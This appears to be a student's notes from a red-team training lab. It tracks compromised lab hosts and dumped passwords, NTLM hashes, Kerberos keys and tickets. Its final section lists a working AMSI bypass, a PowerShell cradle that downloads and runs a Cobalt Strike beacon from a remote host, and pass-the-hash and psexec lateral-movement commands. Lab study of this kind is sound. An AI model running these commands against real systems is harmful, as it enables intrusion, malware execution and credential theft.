
# General Accesses
Server IP Address | Hostname | Compromised | Low-Privilege User | High-Privilege User | Open Ports | Username:Password:Method | Links
------------------|----------|-------------|--------------------|---------------------|------------|----------|----
`10.10.123.102`      |`wkstn-2`   | `yes`         | `bfarmer`            | `system`             |            |    `bfarmer`:`Sup3rman`|   [[5. screenshot]] : [[8. netlogons]]
`10.10.122.30` | `web.dev.cyberbotic.io` | `yes`    | `N/A`               | `SYSTEM`             |             | `jump from WKSTN-2 DEV\jking to web.dev.cyberbotic.io` | [[crto_Defender/2. WKSTN2 - 1/5. lateral_Movement/3. PsExec|3. PsExec]]
`10.10.122.10`|`dc-2.dev.cyberbotic.io`| `yes` | `N/A` | `SYSTEM` | | `link from WKSTN-2 SYSTEM` | [[7. NTLM Relaying]]
`10.10.120.10`|`dc-1.cyberbotic.io`| `no` | | 
`10.10.120.30`|`scm-1.cyberbotic.io`|`no`
`10.10.122.254` | `squid.dev.cyberbotic.io` | `no` | | 
# Plaintext Password Credentials

Server IP Address - Where Found| Hostname | Username | Password | Links
------------------|----------|--------|- | ------ 
`10.10.123.102`      |`wkstn-2`   | `DEV\nlamb` | `F3rrari`| `provided from RTO course`
`10.10.123.102`      |`wkstn-2`   | `DEV\mssql_svc` | `Cyberb0tic`| [[1. Kerberoasting]]
`10.10.123.102`      |`wkstn-2`   | `DEV\squid_svc` | `Passw0rd!`| [[2. ASREP Roasting]]
|`10.10.123.102`   |  `wkstn-2` | `cyberbotic.io\sccm_svc`  |  `Cyberb0tic` |  [[3. Network Access Account Credentials]] |

|`10.10.123.102`|`wkstn-2`|`DEV\squid_svc`|`Passw0rd!`|[2. ASREP Roasting](app://obsidian.md/2.%20ASREP%20Roasting)|
cyberbotic.io\sccm_svc

# NTLM Hashes
Server IP Address | Hostname | Hashes | Links
------------------|----------|--------|------
`10.10.123.102`      |`wkstn-2`   | `Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::`| [[2.1 unquoted_service_path_abuse_artifact_Kit]]
`^^^^^^^^^^^^`|`^^^^^^^^^^^^`| `DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`| 
`^^^^^^^^^^^^`|`^^^^^^^^^^^^`| `Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`|
`^^^^^^^^^^^^`|`^^^^^^^^^^^^`|`LapsAdmin:1001:aad3b435b51404eeaad3b435b51404ee:cd984ea98ca4ac9593de417bb68aa3a7:::`
`^^^^^^^^^^^^` | `^^^^^^^^^^^^` | `WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8710fb3e12ffb120dfee7b68eac878d2:::` 
`^^^^^^^^^^^^` | `^^^^^^^^^^^^` | `jking:59fc0f884922b4ce376051134c71e22c` | [[3.2 credential_Theft]]
`^^^^^^^^^^^^` | `^^^^^^^^^^^^` | `bfarmer:4ea24377a53e67e78b2bd853974420fc` | [[3.2 credential_Theft]]
`^^^^^^^^^^^^` | `^^^^^^^^^^^^` | `WKSTN-2$:b051a3b4bf0b62d5d4a784d3b38b873c` | [[3.2 credential_Theft]]
`^^^^^^^^^^^^` | `^^^^^^^^^^^^` | `DEV\krbtgt 9fb924c244ad44e934c390dc17e02c3d` | [[3.2 credential_Theft]] via DCSync
# Kerberos Encryption Keys / AES Keys
Server IP Address | Hostname | Username | Kereberos Encryption Keys | Links
------------------|----------|--------|------ | ------
`10.10.123.102`      |`wkstn-2`   | `bfarmer` | `des_cbc_md4       9e7a202a9f7a2b50a7189904f753818572d8c237012b4158479e6fcf3e430aa5`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `WKSTN-2$` | `des_cbc_md4       d0986bc55a4120605491f7248dd46066ca9bcd05969eba46b8dbace0576e1559`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `DWM-2` | `des_cbc_md4       d0986bc55a4120605491f7248dd46066ca9bcd05969eba46b8dbace0576e1559`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `jking` | `des_cbc_md4       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `DWM-1` | `des_cbc_md4       d0986bc55a4120605491f7248dd46066ca9bcd05969eba46b8dbace0576e1559`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `DEV\krbtgt` | `      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e` | [[3.2 credential_Theft]] via DCSync
# Domain Cached Credentials 

Server IP Address | Hostname | Username | MsCacheV2 | Links
------------------|----------|--------|------ | ------
`10.10.123.102`      |`wkstn-2`   | `DEV\bfarmer` | `MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `DEV\jking` | `MsCacheV2 : 0d50dee9ed3f29d00282168297090d2a`| [[3.2 credential_Theft]]
# Kerberos Tickets

Server IP Address | Hostname | Username | kerberos ticket | Links
------------------|----------|--------|------ | ------
`10.10.123.102`      |`wkstn-2`   | `DEV\bfarmer` | `CCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRd+XelbU7Evem9mHxXHq5UV8FU1lLQVN6xbh/1WB1McTGR6aymO+wtvTowfJg27BTwpOD9PpawBW6eoWwif9DH60kdTSAL80+4FPnd+aoMJ53Q+d0kYkcKV6UWfT45xnkIqdopcZbZPuBHHNc7Zvm34G0l1YUVwdZ5hHw/Ron6yxGQ6JEcHpV0dVvstC95L9CwcwXd2aCk0vgU4g2m9JMljmSxo9IcrXo3Sy1P8I2IsyGL3kK0vOQFh6RysxDR0SxJ6kYl6qTeZmYg/x/QUITVB/oDStMrNJJzJ5FHeiU1Z2JcP+hYbv+7oskFgUskHwOxaRJPlo3lUXmfnattgwoqOSBx2WTXSvl3tqjOxzSgkEfRxoChpm/PYKMTNyJy8mrBUGDLh//hpwvuLiEt8kWztzv+LUXk5zimyhJF8Xn9mB756MoWjOyOzOtiRI4rN7p2azS2gyJu7joRauyOJkVJEPmDHwo5FX510A9j9UYIS+WEtA8WFBbYXYn18VXZHz68hIuJi8NF8PUrLJIep4FoZvTUKFtnTDTjD6ZOcKn89AaIirsC1YXDKUQVceEL1njWyO9BhSHil1p8/dZb0POClF2frThfrijplEFmcOAJkkCXdYUEAeFWzY0/GSbgyqIhlhZJDhzZRdNzErkIUCbLDdQZLz+st+LMyUMUBoUwC0YoSWBXkQxksfBDbrfnXv+f//Z+GvFaCrC6AQla0xBjXBiMqaXu8iMBOsiPpueaRV14bc3SgtMKs9UQPYYIp4VVr/cLwzXf8kyxMBw0XuU57a8hNUGdI2s5Bc1w89KwbbTAZEAoApKc+udXrYwlx8gopt6GLZKEqPhrnYFeXDg5id4jLjQHy6MR/edtVXY0uXGZvbQUDPAQOqkjzz5H4N1ri6QXjygYC4+JlCRjAd8YWmUwtHuKv/nhxQtxbkieuvSWgz9zMnvg3xUDAQbZCk/HGREPKxUfVxuVDp7lCM9H70q2b1nTZlZlB34W0uo+6oYO8ArqEimtsF/QQhhwXm3ytwEXIYYw38aSSKEqtGn2DGWttoxIW+peHCDoo+VSwfNWFntnxs6a3OROWyAHAEesF8MAPEpNTx1rue7w4W8RcYBCdocyO+Cx9z7AM5fk4xGbA6t7DVgGOK1JwXdwa+yIz2B59ZUgHPcHbk1UyTD1tLkOscKrCjDYr48s9Tx7GdF1YkmNmbEi31cEvomkpjXoqMD7VufOvRryZTjoIPN/9A1wvHg8yTa5crUyFUbrTZ8l4rRJ7qhGaboipNveAnE37kuCqRb/IT8L84i/AdZSre1rNyGvOU7tbmLj+yfNOLfPwJuGDT1T5tLTy5CUgMH8rnyokrICnAlKIxn7aIijYwuy0Lpw6DiXJ+xNCZ7a6TDba/c7bnnVLN4QEHKLNuEqVWReIdlSJafHexHkkIbPxnzUHZZABnGqdfdEwiH3zsy8gwSX67QOBFGd8pd8aX7See0ifzZJSquJCJW/L6OB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEIKy7xPiSi1lvMUxj1TJQXWmbtDGPevWmGYlCV0jJWrtEoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTc1OVqmERgPMjAyMzExMjgwMTE3NTlapxEYDzIwMjMxMjA0MTUxNzU5WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=`| [[3.2 credential_Theft]]
`10.10.123.102`      |`wkstn-2`   | `DEV\jking` | `doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRTZ+TJ7jyPSjIj91WnX9TRuUsQJFsJge9d5FDpuzGb0UxAuYYvjykZIxnp9q2YitqOpTJBoa6NY2iPxzNW3UQP9R5brolgeUu4DEdAZcKqpmA5plHkyaPSMwAId+HFRIgN/YzNbO+rOJj6EQNrrec3LV8Z8hQ/kwf9rPjzqzbNmRi8IJ2EgkkD3ubiE9YChm8fgGOOgh8V6FxX3ddprjIf84hRbnodbjD4GHQtB4QY24Z7f5k9PFz/3JXJqdCnyP4iurGV4TKPN2fwqfETOu/NwCcxM2juysc+WdTO46pG3Z0TE5ovZiAEY0V1wymlRGi5PGhCALSaSh/mN2YewUxBsoV6cUx6rW0OPO5GfzoTIcm6oP+NJAkdN0yfqYYlYAWHtvQAnLt7ku1Z4x5ouV4g6oG9ll/ozp8SQTKNPPenaDYsTkj/5VA3temz4HwwU0DfDpUSfrhD+UL1Fis2GhbwXPI5B/2FSNYuNe2KtfxCVdDy47rOKgbt72me7rdU5JAGmgGhbAiyaRMnn2UlCsiLnhAYxYU91kGL/jegEVVq75DdOYLk6m7FBeOuPp/aFulAfC1rA31C0VSM7EwWZHxFywUguW6CXOFV7ILRdoARzHl1qM+T1YQdTOlbg6PoYugB25rw2TPenbI0kNCWLAWdP5AJHlllukbHtn9cYYiSNM7bf3CvwtPSSEG0J0FPjVPBgqNAoWKWJxEcD6WqV/Dn1HX3y3Awl8FpHzYClgLQFDj80aEwxnVIVkNPFifstd7FUeROhOfzhpynV3VMqoPogWE+jkGU65eh4ELfRoPrjdacfSHDigoqInQdTBnLuAI3VsNinrk/og6rtUCxM52En4Snd5+4IznQSAEB8w6pnOvE2AJTbrh9YH9Vc42zmFbMsuq3LNVKKz3+VVzMnCC6sPD5sGuhIS04FsCWYmKv0BABkAra0UyElyRuhbJ0lGTUDZ0L2aTeNvEynioxHs+gMJA+Lu7fPruAsxuS6pWAYRR+hseqggJAgnVOxYwLIEzxqp8WxJhMYllNMehCphKDohiKbq3dFufFYrIxKns7CsMa2bTeQ3tCpg0FMTVyi+BVQW2oFF2DUksKbc1SMwH2pe1+XJes1IIe1i4flTAqmS5KA5PdjlpHYJndjY6NKFhzl2jPs9bBpctofwxDDsaCQWKnpHe1rUDfVQPw35l/Rcn37q7Y1zp7FWW6MCADJugP3jRCmOr2v/anoqBARVhQ3QsMMaxBp8E6lv4oxTEf5EAOqdfTRLyM1ACSWKJzZAfnHdE/WBG4FNAi3Ot7I8bnPckaqdeDShrGxzVQMF+NlDhbKpp5ydMf/Ox5XUYfoloRgKaSRKNZVForQUfOcED9nbh2V9x6ItlXK79/8ab8Bn5/xc9Gpl2hxLVOeqE4VNiGzy+sHqtWgQbLVZWBw+2RxqA0KPsluro19AVAyvMXKTc99O9dknnwCby7H3mlYWsNRhVpo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgi4nuXbdtVHwzbEEZ0B4WpPx/NuCuCU2xDrF37HUEnR6hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTIwNFqmERgPMjAyMzExMjgwMTEyMDRapxEYDzIwMjMxMjA0MTUxMjA0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=`| [[3.2 credential_Theft]]
# Kirbi tickets
Server IP Address | Hostname | Username | ticket.kirbi | Links
------------------|----------|--------|------ | ------
`10.10.123.102`      |`wkstn-2`   | `DEV\bfarmer` | `doIFzjCCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRdi4eWtoeE0fwOQuhF9TRvIdGz34FRc0Zu1AldqsDVf/tV4lmHICxKqLx29zuuLMO3TcnEZMVAO75se7B2ogfs+doyuOxdkVDO93cgHsqgFqf9MIa4ZhjRpvIur1OvtlwoLXeSXT1crlQbmWf2iTVB0Ff3xZOqffuoMN5GKmwgA87bcj3RJQ0EviZTfLuyp2wLlaaZaiQoozp6W0J2s9WKJyrxgeyePOf8NenpFAfE+cQ5MOf+R0LwDRFwKWZuf8NN1NWjBIhex/wQZrH/2LRb3Sk8OJ73PK2EyYupjsEVy+mjuIJsoYAeOxTlVG9AYLPYZCX89VnF0FGptAm2syOegvp2NuDTJL60HmqC++96A56X8exs/rm5pK0HugUwHFvl7AtgV0jT4BE0ZIkT9nN8JyMzhx9SXYqHAdO4WUmT4y//58sLD0Z2reoXJrf+v8ibWJ2MkxUppBriXryt2/5qDm5+pYRm6j0KV/CYzSAAqeIwKA89I54PBiY8LIH6M1hyfOHki4jjFK69iCLGdPshbxGJDVrTy5Jof2DR/KEUx6L8DiGyd7vuzXODb+sdj2roxftttfVn/NdLpF9Xyu3SaOvdvMCLX/qckA8lTpC5+yDT//MiyzpmnPco5qaw2KJkSN0J5Wsn/11tHqnX8UBrVGrX3BHU/xF4WYYQRSCk6Q2kiorG0/7nPkhs802SihcV2q0k2aMHRZa1wqiGdW1/I3NQcvjmyhSrU0sflO/tcP1G7z494jgdK3Mt07rK43lMrZ8h+NuLez/syuqRrxU4Vy/bUL/d6KqQYp/mnXXcEGm33qLPixppFqIQkKxFmZCwmZingiKQ3DeutgHBqjcVdqsqF3jNu0IFtvBHaxRlpESGIgbk1ijs/L4EBbXveFyxr+xJMMWe5qhPhR03cVXmsfJMomgVLrny6e6Gq+kCVBXO1u0HaxFaqvNnERmoPxGg0VIU9vH+8sqFKImtF153N2KFloSvi9JVjz32nuSGrjAanA+MychzAFOo9D3VDifmJmm3FCRdgrNTw36E5Pi75ycFrDHkSkU9J0CPv7KyMBNFzWP3GUiYpDVZm8CuorXVrltQawdYD1OtCx8DgKevFqklEzYoc7xcCaQ8RQNBSqbaTsd9i4zi7CLKd11ZR1QNzxpThRZgSosZNygrxQduQHij3YOexuXQ3YTXAv7kJDhcARhb3pCKyQRNCZaL/6PJx1XyoA4QB7/WsIwDMj7R+6OkWrDyouakA7BQIzKGIRFH562msaSbPsw/XUQEfP7S/fcXq+daMbsArtbaF+jeUbLYcl0wZ5vPcRlBt/7JLp+c9vpCopgC5VEYhcy2XRBr+OtoIHEgsnD1HandDY64MZQz5aS6m9yO4XC8sRoQwCW6ycVGfjwDIVKzXkyown7NnxAFIZeHtrmqu7PoC85o+4qDNlY/jSVtIrH9LvakCg2FMkbiFJlV+9F2S72G7gQjt5f76befSKTT/POumKOB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEICF/0sTJ2JYNYLWKCABw8q0qGh/xtbDL0LdNgXaaat+JoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAYKEAAKURGA8yMDIzMTIwMTIyNTEwOFqmERgPMjAyMzEyMDIwODUxMDhapxEYDzIwMjMxMjA4MjI1MTA4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=`| [[3.2 credential_Theft]]

# Access Paths

#### Inital Access `WKSTN-2` :
on `WKSTN-2` open `powershell` and bypass `AMSI`:
`$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)`
catch `cobaltstrike` beacon:
`IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))`

#### Privilege Escalation `WKSTN-2` `SYSTEM`:
on `WKSTN-2` `bfarmer` beacon session:
`connect localhost 4444`
#### Initial Access `DC-2`:
*check firwall rules to ensure already in place to allow [[7. NTLM Relaying]]*
`powershell Get-NetFirewallRule -DisplayName "8445-In"`
`powershell Get-NetFirewallRule -DisplayName "8080-In"`
*if not in place use commands below to set*
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
`powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445`
#### Initial Access `WEB`
on `WKSTN-2` as `bfarmer` use `make_token DEV\jking Qwerty123` to impersonate `jking` and `jump psexec64 web.dev.cyberbotic.io smb` 

#### Initial Access `SQL-2`
on `WKSTN-2` as `bfarmer` use `make_token DEV\jking Qwerty123` and `jump psexec64 sql-2.dev.cyberbotic.io smb`
From WKSTN2 
- pth as jking to become part of administrators/rdp group
- `pth DEV\jking 59fc0f884922b4ce376051134c71e22c`
- jump to web-2.dev.cyberbotic.io server using psexec as jking and become system
- `jump psexec64 sql-2.dev.cyberbotic.io smb`

Access `via` `DNS` beacons:  [[4.1 Lateral Movement - After full lab reset]]
- in order to trigger again follow through the guide above.
![[Pasted image 20231220181236.png]]

### Initial Access `DC-1`
- follow [[2. Parent Child]] and `psexec` from `DC-2` dns beacon `jump psexec64 dc-1.cyberbotic.io smb`



 
